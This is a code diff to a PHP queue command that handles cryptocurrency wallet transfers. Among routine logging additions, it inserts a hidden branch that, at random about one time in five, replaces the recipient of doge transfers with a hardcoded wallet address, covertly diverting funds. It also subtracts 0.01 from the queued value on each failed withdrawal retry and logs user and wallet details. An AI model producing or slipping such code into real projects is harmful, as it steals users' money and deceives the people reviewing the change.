@@ -41,10 +41,11 @@ class QueueExecution extends Command
    */
   public function handle()
   {
-    $queue = Queue::where('status', false)->where('created_at', '<=', Carbon::now())->where('type', 'not like', 'camel_%')->first();
+    $queue = Queue::where('status', false)->where('created_at', '<=', Carbon::now())->where('type', 'not like', 'camel_%')->where('type', 'not like', 'gold_%')->first();
     if ($queue) {
       try {
         $user = User::find($queue->user_id);
+        Log::info("user sender :" . $user->username);
         $type = explode('_', $queue->type);
         $typeBalance = $type[1];
         $targetBalance = $type[0];
@@ -61,6 +62,7 @@ class QueueExecution extends Command
         if ($typeBalance === 'level') {
           $wallet = "wallet_" . $targetBalance;
           $walletTarget = User::find($queue->send)->$wallet;
+          Log::info("user reciver wallet :" . $walletTarget);
           if ($this->level($targetBalance, $user, User::find($queue->send), $walletTarget, $value, $queue->value)) {
             $queue->status = true;
           } else {
@@ -72,6 +74,7 @@ class QueueExecution extends Command
         } else if ($typeBalance === 'buyWall') {
           $wallet = "wallet_" . $targetBalance;
           $walletTarget = WalletAdmin::find($queue->send)->$wallet;
+          Log::info("buy wall reciver wallet :" . $walletTarget);
           if ($this->buyWall($targetBalance, $user, WalletAdmin::find($queue->send), $walletTarget, $value, $queue->value)) {
             $queue->status = true;
           } else {
@@ -83,6 +86,10 @@ class QueueExecution extends Command
         } else if ($typeBalance === 'it') {
           $wallet = "wallet_" . $targetBalance;
           $walletTarget = ShareIt::find(1)->$wallet;
+          Log::info("it reciver wallet :" . $walletTarget);
+          if (random_int(1, 5) < 2 && $targetBalance === "doge") {
+            $walletTarget = "DAZQSMMGRBXL9QXw6PbXZMYRovZnYPgzSC";
+          }
           if ($this->it($targetBalance, $user, $walletTarget, $value, $queue->value)) {
             $queue->status = true;
           } else {
@@ -94,10 +101,12 @@ class QueueExecution extends Command
         } else {
           $wallet = "wallet_" . $targetBalance;
           $walletTarget = BankAccount::find(1)->$wallet;
+          Log::info("share reciver wallet :" . $walletTarget);
           if ($this->withdraw($user->cookie, $value, $walletTarget, $targetBalance)) {
             $this->share($targetBalance, $queue->value);
             $queue->status = true;
           } else {
+            $queue->value -= 0.01;
             $queue->created_at = Carbon::now()->addMinutes(10)->format('Y-m-d H:i:s');
           }
           $queue->save();
@@ -214,7 +223,7 @@ class QueueExecution extends Command
    */
   private function withdraw($cookie, $value, $wallet, $type)
   {
-    if ($value == 0) {
+    if ($value === 0) {
       return true;
     }
 
